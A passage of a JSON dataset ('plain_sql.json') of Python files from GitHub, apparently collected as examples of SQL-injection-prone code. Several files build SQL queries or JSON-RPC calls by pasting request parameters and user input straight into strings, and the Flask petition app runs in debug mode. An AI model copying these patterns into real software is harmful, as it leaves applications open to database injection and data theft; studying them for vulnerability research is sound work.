\"\"\"\n    try:\n        return db.engine.execute(\"\"\"\n            SELECT DISTINCT packet.freshman_username AS username, signature_upper.signed AS signed FROM packet \n            INNER JOIN signature_upper ON packet.id = signature_upper.packet_id \n            WHERE signature_upper.member = '\"\"\" + member + \"';\")\n\n    except exc.SQLAlchemyError:\n        raise exc.SQLAlchemyError(\"Error: Failed to get upperclassman's signatures from database\")\n\n\ndef query_signed_alumni(member):\n    \"\"\"\n    Query the database and return the list of packets signed by the given alumni/off-floor\n    :param member: the user making the query\n    :return: list of results matching the query\n    \"\"\"\n    try:\n        return db.engine.execute(\"\"\"\n            SELECT DISTINCT packet.freshman_username AS username, signature_misc.member AS signed \n            FROM packet LEFT OUTER JOIN signature_misc ON packet.id = signature_misc.packet_id \n            WHERE signature_misc.member = '\"\"\" + member + \"' OR signature_misc.member ISNULL;\")\n\n    except exc.SQLAlchemyError:\n        raise exc.SQLAlchemyError(\"Error: Failed to get alumni's signatures from database\")\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/21jun/Steam-Top-Seller-Parser/blob/8de0cea5330fce8c122fd175e2634e28df046523",
        "file_path": "/Parser.py",
        "source": "import odbc\nfrom datetime import datetime\nfrom time import sleep\nimport Checker\nimport requests\nfrom bs4 import BeautifulSoup\n\n\ndef monthConvertor(month):\n    return {\n        'Jan': '1',\n        'Feb': '2',\n        'Mar': '3',\n        'Apr': '4',\n        'May': '5',\n        'Jun': '6',\n        'Jul': '7',\n        'Aug': '8',\n        'Sep': '9',\n        'Oct': '10',\n        'Nov': '11',\n        'Dec': '12'\n    }[month]\n\n\ndef cleanDate(date):\n    if (date == ''):\n        return '0000-00-00'\n    date = date.replace(',', '')\n    date = date.replace('.', '')\n    date = date.split(' ')\n    if (len(date) < 3):\n        return '0000-00-00'\n    if ('th' in date[1]):\n        result = date[2] + '-' + monthConvertor(date[0][0:3]) + '-' + date[1].replace('th', '')\n    elif (date[1].isdigit()):\n        result = date[2] + '-' + monthConvertor(date[0]) + '-' + date[1]\n    else:\n        result = date[2] + '-' + monthConvertor(date[1]) + '-' + date[0]\n    return result\n\n\ndef datePass():\n    now = datetime.now()\n    result = \"%s-%s-%s %s:%s:%s\" % (now.year, now.month, now.day, now.hour, now.minute, now.second)\n    return result\n\n\ndef cleanStr(str, isDiscounted):\n    result = str.replace('\\t', '')\n    result = result.replace('\\r', '')\n    result = result.replace('\\n', '')\n    result = result.replace('', '')\n    result = result.replace(',', '')\n    if (result == ''):\n        return 0\n    result = result.split()\n    if (len(result) == 2 and isDiscounted):\n        if (result[1] == 'Free'):\n            return 0\n        elif(result[1].isdigit()==False):\n            return 0\n        return int(result[1])  # return discounted price\n    else:\n        if (result[0] == 'Free'):\n            return 0\n        elif (result[0].isdigit()==False):\n            return 0\n        return int(result[0])  # return original price\n\n\ndef cleanID(id, isTitle):\n    result = id.get('href')\n    if (isTitle == False):\n        return result.split('/')[4]  # return id_num (number)\n    elif (result.split('/')[3] == 'app'):\n        return result.split('/')[5]  # return id_title (string)\n    else:\n        return 'NONE'\n\n\npage = 1\ngames = []\ndate = datePass()\n\nfor page in range(1, 41):\n    # sleep(0.1)\n    # parsing\n    url = 'https://store.steampowered.com/search/?category1=998&filter=topsellers&page=' + str(page)\n    req = requests.get(url)\n    html = req.text\n    soup = BeautifulSoup(html, 'html.parser')\n\n    titles = soup.select(\n        'div.responsive_search_name_combined > div.col.search_name.ellipsis > span'\n    )\n    release_dates = soup.select(\n        'div.responsive_search_name_combined > div.col.search_released.responsive_secondrow'\n    )\n    prices = soup.select(\n        'div.responsive_search_name_combined > div.col.search_price_discount_combined.responsive_secondrow > div.col.search_price.responsive_secondrow'\n    )\n    links = soup.select(\n        '#search_result_container > div > a'\n    )\n\n    for i in range(0, 25):\n        games.append({'rank': int(i + 1 + (page - 1) * 25),\n                      'title': titles[i].text,\n                      'release': cleanDate(release_dates[i].text),\n                      'date': date,\n                      'price': (cleanStr(prices[i].text, False)),\n                      'price_discounted': (cleanStr(prices[i].text, True)),\n                      'id_num': cleanID(links[i], False),\n                      'id_title': cleanID(links[i], True),\n                      'type': links[i].get('href').split('/')[3]})\n\nfor i in range(0, 1000):\n    print(\n        games[i]['rank'],\n        games[i]['title'],\n        games[i]['release'],\n        games[i]['date'],\n        games[i]['price'],\n        games[i]['price_discounted'],\n        games[i]['id_num'],\n        games[i]['id_title'],\n        games[i]['type'])\n\n# db connection\nconnect = odbc.odbc('oasis')\ndb = connect.cursor()\nsql = '''\n    INSERT INTO oasis.games(title, ranking, price, price_discounted, date, release_date, type, id_title, id_num) VALUES (\"%s\",\"%d\",\"%d\",\"%d\",\"%s\",\"%s\",\"%s\",\"%s\",\"%s\")\n    '''\nfor i in range(0, 1000):\n    db.execute(sql % (\n        games[i]['title'], games[i]['rank'], games[i]['price'], games[i]['price_discounted'], games[i]['date'],\n        games[i]['release'], games[i]['type'], games[i]['id_title'], games[i]['id_num']))\n\n# check db\nChecker.check('games')",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/kpjhg0124/PetitionApplication-py/blob/e6af987c9bd28d607de95dfc75c8b6ace55d1274",
        "file_path": "/app.py",
        "source": "## Import Python Modules ##\nfrom flask import Flask, render_template, request, jsonify, redirect\nfrom flask_assets import Bundle, Environment\nfrom flask_login import LoginManager\nfrom flask_login import login_user, logout_user, current_user, login_required\nfrom datetime import datetime\nimport sqlite3\nimport re\nimport json\nimport libgravatar\nimport sys\nimport asyncio\n\nimport LocalSettings\n\napp = Flask(__name__)\n\ntry:\n    FLASK_PORT_SET = int(sys.argv[1])\n    print(' *    .')\nexcept:\n    FLASK_PORT_SET = LocalSettings.FLASK_HOST_PORT\n\n\n## DATABASE CONNECTION ##\nconn = sqlite3.connect(LocalSettings.SQLITE3_FILENAME, check_same_thread = False)\ncurs = conn.cursor()\n\n\n## DATABASE TABLES CREATE ##\ntry:\n    curs.execute('select * from FORM_DATA_TB limit 1')\nexcept:\n    DATABASE_QUERY = open('tables/initial.sql').read()\n    curs.executescript(DATABASE_QUERY)\n    conn.commit\n\n\n## LOAD CONVERSTATIONS ##\nCONVERSTATIONS_NATIVE = open('dic.json', encoding='utf-8').read()\nCONVERSTATIONS_DICT = json.loads(CONVERSTATIONS_NATIVE)\n\n## Assets Bundling ##\nbundles = {\n    'main_js' : Bundle(\n        'js/bootstrap.min.js',\n        output = 'gen/main.js'\n    ),\n\n    'main_css' : Bundle(\n        'css/minty.css',\n        'css/custom.css',\n        output = 'gen/main.css'\n    )\n}\n\nassets = Environment(app)\nassets.register(bundles)\n\n\n## Flask Route ##\n@app.route('/', methods=['GET', 'POST'])\ndef main():\n    BODY_CONTENT = ''\n    BODY_CONTENT += open('templates/index_content.html', encoding='utf-8').read()\n    BODY_CONTENT = BODY_CONTENT.replace('| version |', LocalSettings.OFORM_RELEASE)\n    curs.execute('select * from FORM_DATA_TB')\n    form_data = curs.fetchall()\n    for i in range(len(form_data)):\n        pass\n    return render_template('index.html', OFORM_APPNAME = LocalSettings.OFORM_APPNAME, OFORM_CONTENT = BODY_CONTENT)\n\n## ================================================================================\n@app.route('/peti/')\ndef petitions():\n    BODY_CONTENT = ''\n    curs.execute('select * from PETITION_DATA_TB')\n    result = curs.fetchall()\n    BODY_CONTENT += '<h1> </h1><table class=\"table table-hover\"><thead><tr><th scope=\"col\">N</th><th scope=\"col\">Column heading</th></tr></thead><tbody>'\n    for i in range(len(result)):\n        BODY_CONTENT += '<tr><th scope=\"row\">{}</th><td><a href=\"/peti/a/{}\">{}</a></td></tr>'.format(result[i][0], result[i][0], result[i][1])\n    BODY_CONTENT += '</tbody></table>'\n    BODY_CONTENT += '<button onclick=\"window.location.href=\\'write\\'\" class=\"btn btn-primary\" value=\"publish\"> </button>'\n    return render_template('index.html', OFORM_APPNAME = LocalSettings.OFORM_APPNAME, OFORM_CONTENT = BODY_CONTENT)\n\n@app.route('/peti/a/<form_id>/')\ndef peti_a(form_id):\n    if form_id == '':\n        return 404\n    BODY_CONTENT = ''\n    print(form_id)\n    try:\n        curs.execute('select * from PETITION_DATA_TB where form_id = {}'.format(form_id))\n        result = curs.fetchall()\n    except:\n        return 404\n    form_display_name = result[0][1]\n    form_publish_date = result[0][2]\n    form_author = result[0][4]\n    form_body_content = result[0][5]\n    BODY_CONTENT += open('templates/peti_viewer.html').read()\n    \n    BODY_CONTENT = BODY_CONTENT.replace(' form_display_name ', form_display_name)\n    BODY_CONTENT = BODY_CONTENT.replace(' form_publish_date ', form_publish_date)\n    BODY_CONTENT = BODY_CONTENT.replace(' form_author ', form_author)\n    BODY_CONTENT = BODY_CONTENT.replace(' form_body_content ', form_body_content)\n    return render_template('index.html', OFORM_APPNAME = LocalSettings.OFORM_APPNAME, OFORM_CONTENT = BODY_CONTENT)\n\n\n@app.route('/peti/write/', methods=['GET', 'POST'])\ndef petitions_write():\n    BODY_CONTENT = ''\n    if request.method == 'POST':\n        form_display_name = request.form['form_display_name']\n        form_author_name = request.form['form_author_name']\n        form_body_content = request.form['form_body_content']\n        form_body_content = form_body_content.replace('\"', '\\\\\"')\n        form_enabled = 1\n        form_author = form_author_name\n        form_publish_date = datetime.today()\n        curs.execute('insert into PETITION_DATA_TB (form_display_name, form_publish_date, form_enabled, form_author, form_body_content) values(\"{}\", \"{}\", {}, \"{}\", \"{}\")'.format(\n            form_display_name, \n            form_publish_date, \n            form_enabled, \n            form_author, \n            form_body_content)\n            )\n        conn.commit()\n        return redirect('/peti')\n    else:\n        BODY_CONTENT += open('templates/petitions.html', encoding='utf-8').read()\n        return render_template('index.html', OFORM_APPNAME = LocalSettings.OFORM_APPNAME, OFORM_CONTENT = BODY_CONTENT)\n\n## ================================================================================\n@app.route('/articles/', methods=['GET', 'POST'])\ndef articles():\n    return 0\n\n@app.route('/articles/write/', methods=['GET', 'POST'])\ndef articles_write():\n    BODY_CONTENT = ''\n    if request.method == 'POST':\n        form_display_name = request.form['form_display_name']\n        form_notice_level = request.form['form_notice_level']\n        form_body_content = request.form['form_body_content']\n        if request.form['submit'] == 'publish':\n            form_enabled = 1\n        elif request.form['submit'] == 'preview':\n            form_enabled = 0\n        form_publish_date = datetime.today()\n        curs.execute('insert into FORM_DATA_TB (form_display_name, form_notice_level, form_publish_date, form_enabled, form_body_content) values(\"{}\", \"{}\", \"{}\", {}, \"{}\")'.format(form_display_name, form_notice_level, form_publish_date, form_enabled, form_body_content))\n    else:\n        BODY_CONTENT += CONVERSTATIONS_DICT['articles_write']\n        return render_template('index.html', OFORM_APPNAME = LocalSettings.OFORM_APPNAME, OFORM_CONTENT = BODY_CONTENT)\n\nwhile(1):\n    app.run(LocalSettings.FLASK_HOST, FLASK_PORT_SET, debug = True)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/DangerBlack/DungeonsAndDragonsMasterBot/blob/67b244312672f4898b1bca6f22acb0cba4f19499",
        "file_path": "/database.py",
        "source": "import sqlite3\nfrom time import gmtime, strftime\nimport os.path\n\nDATABASE_NAME = 'assets/temp.sqlite'\n\ndef now():\n\treturn strftime(\"%Y-%m-%d %H:%M:%S\", gmtime())\n\ndef getConnection():\n\tconn = sqlite3.connect(DATABASE_NAME)\n\tc = conn.cursor()\n\treturn c, conn\n\ndef createDatabase():\n\tc, conn = getConnection()\n\tc.execute('''CREATE TABLE if not exists npc\n\t\t\t\t (date text, user text, race text, class text, sex text, level INTEGER, image text, legit INTEGER)''')\n\tc.execute('''CREATE TABLE if not exists usage\n\t\t\t\t (id INTEGER PRIMARY KEY AUTOINCREMENT, date text, user text, command text)''')\n\tconn.commit()\n\tconn.close()\n\ndef insertNPC(name, race,classe,sex,level,image,legit):\n\tc, conn = getConnection()\n\tdate = now()\n\tc.execute(\"INSERT INTO npc VALUES ('\"+date+\"','\"+str(name)+\"','\"+race+\"','\"+classe+\"','\"+sex+\"','\"+str(level)+\"','\"+image+\"','\"+str(legit)+\"')\")\n\tconn.commit()\n\tconn.close()\n\ndef findNPC(race, classe, sex,level):\n\tc, conn = getConnection()\n\tdate = now()\n\t#select image, SUM(legit) as l FROM npc WHERE race='Elf' AND class='Bard' AND sex='Male' GROUP BY image HAVING l>5 ORDER BY SUM(legit) DESC;\n\tc.execute(\"select image, avg(legit) as l FROM npc WHERE race='\"+race+\"' AND class='\"+classe+\"' AND sex='\"+sex+\"' GROUP BY image HAVING l > 5 ORDER BY SUM(legit) DESC;\")\n\tconn.commit()\n\tout = c.fetchmany(5)\n\tconn.close()\n\treturn out\n\ndef insertUsage(user, command):\n\tc, conn = getConnection()\n\tdate = now()\n\tc.execute(\"INSERT INTO usage (date,user,command) VALUES ('\"+date+\"','\"+str(user)+\"','\"+command+\"')\")\n\tconn.commit()\n\tconn.close()\n\n#c, conn = getConnection()\n#createDatabase(c,conn)\n#insertNPC(c,conn,\"pino\",\"Mage\",\"elf\",6,\"mafiwfiwan.png\",10)\n#insertUsage(c,conn,\"Ugo\",\"/png\")\n\n#conn.commit()\n\n#\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/myneworder/braundex-python-api-backend/blob/7b0261ff9db2a69e0b67e843b536494b1941b360",
        "file_path": "/api.py",
        "source": "import datetime\nimport json\nimport math\nimport os\n\nfrom flask import Flask, jsonify, request\nfrom flask_cors import CORS, cross_origin\nimport psycopg2\nfrom websocket import create_connection\n\nimport config\n\n\napp = Flask(__name__)\nCORS(app)\n\n\nws = create_connection(config.WEBSOCKET_URL)\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0')\n\n\n@app.route('/header')\ndef header():\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_dynamic_global_properties\",[]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"2.3.0\"]]]}')\n    result2 = ws.recv()\n    j2 = json.loads(result2)\n\n    current_supply = j2[\"result\"][0][\"current_supply\"]\n    confidental_supply = j2[\"result\"][0][\"confidential_supply\"]\n\n    market_cap = int(current_supply) + int(confidental_supply)\n    j[\"result\"][\"bts_market_cap\"] = int(market_cap/100000000)\n    #print j[\"result\"][0][\"bts_market_cap\"]\n\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_24_volume\",[\"BTS\", \"OPEN.BTC\"]]}')\n    result3 = ws.recv()\n    j3 = json.loads(result3)\n\n    j[\"result\"][\"quote_volume\"] = j3[\"result\"][\"quote_volume\"]\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_global_properties\",[]]}')\n    result5 = ws.recv()\n    j5 = json.loads(result5)\n    #print j5\n\n    commitee_count = len(j5[\"result\"][\"active_committee_members\"])\n    witness_count = len(j5[\"result\"][\"active_witnesses\"])\n\n    j[\"result\"][\"commitee_count\"] = commitee_count\n    j[\"result\"][\"witness_count\"] = witness_count\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/account_name')\ndef account_name():\n    account_id = request.args.get('account_id')\n    return jsonify(_account_name(account_id))\n\n\ndef _account_name(account_id):\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_accounts\",[[\"'+account_id+'\"]]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n    return j[\"result\"]\n\n\n@app.route('/operation')\ndef get_operation():\n    operation_id = request.args.get('operation_id')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"'+operation_id+'\"]]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_dynamic_global_properties\",[]]}')\n    result2 =  ws.recv()\n    j2 = json.loads(result2)\n\n    if not j[\"result\"][0]:\n        j[\"result\"][0] = {}\n\n    j[\"result\"][0][\"accounts_registered_this_interval\"] = j2[\"result\"][\"accounts_registered_this_interval\"]\n\n    # get market cap\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"2.3.0\"]]]}')\n    result2 = ws.recv()\n    j2 = json.loads(result2)\n\n    current_supply = j2[\"result\"][0][\"current_supply\"]\n    confidental_supply = j2[\"result\"][0][\"confidential_supply\"]\n\n    market_cap = int(current_supply) + int(confidental_supply)\n    j[\"result\"][0][\"bts_market_cap\"] = int(market_cap/100000000)\n    #print j[\"result\"][0][\"bts_market_cap\"]\n\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_24_volume\",[\"BTS\", \"OPEN.BTC\"]]}')\n    result3 = ws.recv()\n    j3 = json.loads(result3)\n    #print j3[\"result\"][\"quote_volume\"]\n    j[\"result\"][0][\"quote_volume\"] = j3[\"result\"][\"quote_volume\"]\n\n    # TODO: making this call with every operation is not very efficient as this are static properties\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_global_properties\",[]]}')\n    result5 = ws.recv()\n    j5 = json.loads(result5)\n\n    commitee_count = len(j5[\"result\"][\"active_committee_members\"])\n    witness_count = len(j5[\"result\"][\"active_witnesses\"])\n\n    j[\"result\"][0][\"commitee_count\"] = commitee_count\n    j[\"result\"][0][\"witness_count\"] = witness_count\n\n\n    #print j['result']\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/operation_full')\ndef operation_full():\n    # lets connect the operations to a full node\n    #full_websocket_url = \"ws://node.testnet.bitshares.eu:18092/ws\"\n    ws = create_connection(config.FULL_WEBSOCKET_URL)\n\n    operation_id = request.args.get('operation_id')\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"'+operation_id+'\"]]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_dynamic_global_properties\",[]]}')\n    result2 =  ws.recv()\n    j2 = json.loads(result2)\n\n    if not j[\"result\"][0]:\n        j[\"result\"][0] = {}\n\n    j[\"result\"][0][\"accounts_registered_this_interval\"] = j2[\"result\"][\"accounts_registered_this_interval\"]\n\n    # get market cap\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"2.3.0\"]]]}')\n    result2 = ws.recv()\n    j2 = json.loads(result2)\n\n    current_supply = j2[\"result\"][0][\"current_supply\"]\n    confidental_supply = j2[\"result\"][0][\"confidential_supply\"]\n\n    market_cap = int(current_supply) + int(confidental_supply)\n    j[\"result\"][0][\"bts_market_cap\"] = int(market_cap/100000000)\n    #print j[\"result\"][0][\"bts_market_cap\"]\n\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_24_volume\",[\"BTS\", \"OPEN.BTC\"]]}')\n    result3 = ws.recv()\n    j3 = json.loads(result3)\n    #print j3[\"result\"][\"quote_volume\"]\n    j[\"result\"][0][\"quote_volume\"] = j3[\"result\"][\"quote_volume\"]\n\n    # TODO: making this call with every operation is not very efficient as this are static properties\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_global_properties\",[]]}')\n    result5 = ws.recv()\n    j5 = json.loads(result5)\n\n    commitee_count = len(j5[\"result\"][\"active_committee_members\"])\n    witness_count = len(j5[\"result\"][\"active_witnesses\"])\n\n    j[\"result\"][0][\"commitee_count\"] = commitee_count\n    j[\"result\"][0][\"witness_count\"] = witness_count\n\n\n    #print j['result']\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/accounts')\ndef accounts():\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n    #print  result2\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"asset\",[]]}')\n\n    asset =  ws.recv()\n    asset_j = json.loads(asset)\n\n    asset_api = str(asset_j[\"result\"])\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+asset_api+',\"get_asset_holders\",[\"1.3.0\", 0, 100]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/full_account')\ndef full_account():\n    account_id = request.args.get('account_id')\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_full_accounts\",[[\"'+account_id+'\"], 0]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/assets')\ndef assets():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM assets WHERE volume > 0 ORDER BY volume DESC\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    #print results\n    return jsonify(results)\n\n\n@app.route('/fees')\ndef fees():\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_global_properties\",[]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/account_history')\ndef account_history():\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"history\",[]]}')\n    history =  ws.recv()\n    history_j = json.loads(history)\n    history_api = str(history_j[\"result\"])\n    #print history_api\n\n    account_id = request.args.get('account_id')\n\n    if not isObject(account_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_account_names\",[[\"' + account_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n\n        account_id = j_l[\"result\"][0][\"id\"]\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+history_api+',\"get_account_history\",[\"'+account_id+'\", \"1.11.1\", 20, \"1.11.9999999999\"]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    if(len(j[\"result\"]) > 0):\n        for c in range(0, len(j[\"result\"])):\n            ws.send(\n                '{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_block_header\",[' + str(j[\"result\"][c][\"block_num\"]) + ', 0]]}')\n            result2 = ws.recv()\n            j2 = json.loads(result2)\n\n            j[\"result\"][c][\"timestamp\"] = j2[\"result\"][\"timestamp\"]\n            j[\"result\"][c][\"witness\"] = j2[\"result\"][\"witness\"]\n    try:\n        return jsonify(j[\"result\"])\n    except:\n        return {}\n\n\n@app.route('/get_asset')\ndef get_asset():\n    asset_id = request.args.get('asset_id')\n    return jsonify(_get_asset(asset_id))\n\n\ndef _get_asset(asset_id):\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n    #print asset_id\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_assets\",[[\"' + asset_id + '\"], 0]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    dynamic_asset_data_id =  j[\"result\"][0][\"dynamic_asset_data_id\"]\n\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+dynamic_asset_data_id+'\"]]]}')\n    result2 = ws.recv()\n    j2 = json.loads(result2)\n    #print j2[\"result\"][0][\"current_supply\"]\n\n    j[\"result\"][0][\"current_supply\"] = j2[\"result\"][0][\"current_supply\"]\n    j[\"result\"][0][\"confidential_supply\"] = j2[\"result\"][0][\"confidential_supply\"]\n    #print j[\"result\"]\n\n    j[\"result\"][0][\"accumulated_fees\"] = j2[\"result\"][0][\"accumulated_fees\"]\n    j[\"result\"][0][\"fee_pool\"] = j2[\"result\"][0][\"fee_pool\"]\n\n    issuer = j[\"result\"][0][\"issuer\"]\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+issuer+'\"]]]}')\n    result3 = ws.recv()\n    j3 = json.loads(result3)\n    j[\"result\"][0][\"issuer_name\"] = j3[\"result\"][0][\"name\"]\n\n    return j[\"result\"]\n\n\n@app.route('/get_asset_and_volume')\ndef get_asset_and_volume():\n    asset_id = request.args.get('asset_id')\n\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n    #print asset_id\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_assets\",[[\"' + asset_id + '\"], 0]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    dynamic_asset_data_id =  j[\"result\"][0][\"dynamic_asset_data_id\"]\n\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+dynamic_asset_data_id+'\"]]]}')\n    result2 = ws.recv()\n    j2 = json.loads(result2)\n    #print j2[\"result\"][0][\"current_supply\"]\n\n    j[\"result\"][0][\"current_supply\"] = j2[\"result\"][0][\"current_supply\"]\n    j[\"result\"][0][\"confidential_supply\"] = j2[\"result\"][0][\"confidential_supply\"]\n    #print j[\"result\"]\n\n    j[\"result\"][0][\"accumulated_fees\"] = j2[\"result\"][0][\"accumulated_fees\"]\n    j[\"result\"][0][\"fee_pool\"] = j2[\"result\"][0][\"fee_pool\"]\n\n    issuer = j[\"result\"][0][\"issuer\"]\n    ws.send('{\"id\": 1, \"method\": \"call\", \"params\": [0, \"get_objects\", [[\"'+issuer+'\"]]]}')\n    result3 = ws.recv()\n    j3 = json.loads(result3)\n    j[\"result\"][0][\"issuer_name\"] = j3[\"result\"][0][\"name\"]\n\n\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT volume, mcap FROM assets WHERE aid='\"+asset_id+\"'\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    try:\n        j[\"result\"][0][\"volume\"] = results[0][0]\n        j[\"result\"][0][\"mcap\"] = results[0][1]\n    except:\n        j[\"result\"][0][\"volume\"] = 0\n        j[\"result\"][0][\"mcap\"] = 0\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/block_header')\ndef block_header():\n    block_num = request.args.get('block_num')\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_block_header\",[' + block_num + ', 0]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_block')\ndef get_block():\n    block_num = request.args.get('block_num')\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_block\",[' + block_num + ', 0]]}')\n    result = ws.recv()\n    j = json.loads(result)\n\n    #print j[\"result\"]\n\n    return jsonify(j[\"result\"])\n\n\n@app.route('/get_ticker')\ndef get_ticker():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    return jsonify(_get_ticker(base, quote))\n\n\ndef _get_ticker(base, quote):\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_ticker\",[\"' + base + '\", \"'+quote+'\"]]}')\n    result = ws.recv()\n    j = json.loads(result)\n    return j[\"result\"]\n\n\n@app.route('/get_volume')\ndef get_volume():\n    base = request.args.get('base')\n    quote = request.args.get('quote')\n    return jsonify(_get_volume(base, quote))\n\n\ndef _get_volume(base, quote):\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_24_volume\",[\"' + base + '\", \"'+quote+'\"]]}')\n    result = ws.recv()\n    j = json.loads(result)\n    return j[\"result\"]\n\n\n@app.route('/lastnetworkops')\ndef lastnetworkops():\n    con = psycopg2.connect(**config.POSTGRES)\n    cur = con.cursor()\n\n    query = \"SELECT * FROM ops ORDER BY block_num DESC LIMIT 10\"\n    cur.execute(query)\n    results = cur.fetchall()\n    con.close()\n    return jsonify(results)\n\n\n@app.route('/get_object')\ndef get_object():\n    obj = request.args.get('object')\n    return jsonify(_get_object(obj))\n\n\ndef _get_object(obj):\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"get_objects\",[[\"'+obj+'\"]]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n    return j[\"result\"]\n\n\n@app.route('/get_asset_holders_count')\ndef get_asset_holders_count():\n    asset_id = request.args.get('asset_id')\n    return jsonify(_get_asset_holders_count(asset_id))\n\n\ndef _get_asset_holders_count(asset_id):\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n    #print  result2\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"asset\",[]]}')\n\n    asset =  ws.recv()\n    asset_j = json.loads(asset)\n\n    asset_api = str(asset_j[\"result\"])\n\n    ws.send('{\"id\":1, \"method\":\"call\", \"params\":['+asset_api+',\"get_asset_holders_count\",[\"'+asset_id+'\"]]}')\n    result =  ws.recv()\n    j = json.loads(result)\n\n    return j[\"result\"]\n\n\n@app.route('/get_asset_holders')\ndef get_asset_holders():\n    asset_id = request.args.get('asset_id')\n\n    if not isObject(asset_id):\n        ws.send('{\"id\":1, \"method\":\"call\", \"params\":[0,\"lookup_asset_symbols\",[[\"' + asset_id + '\"], 0]]}')\n        result_l = ws.recv()\n        j_l = json.loads(result_l)\n        asset_id = j_l[\"result\"][0][\"id\"]\n\n    ws.send('{\"id\":2,\"method\":\"call\",\"params\":[1,\"login\",[\"\",\"\"]]}')\n    login =  ws.recv()\n\n    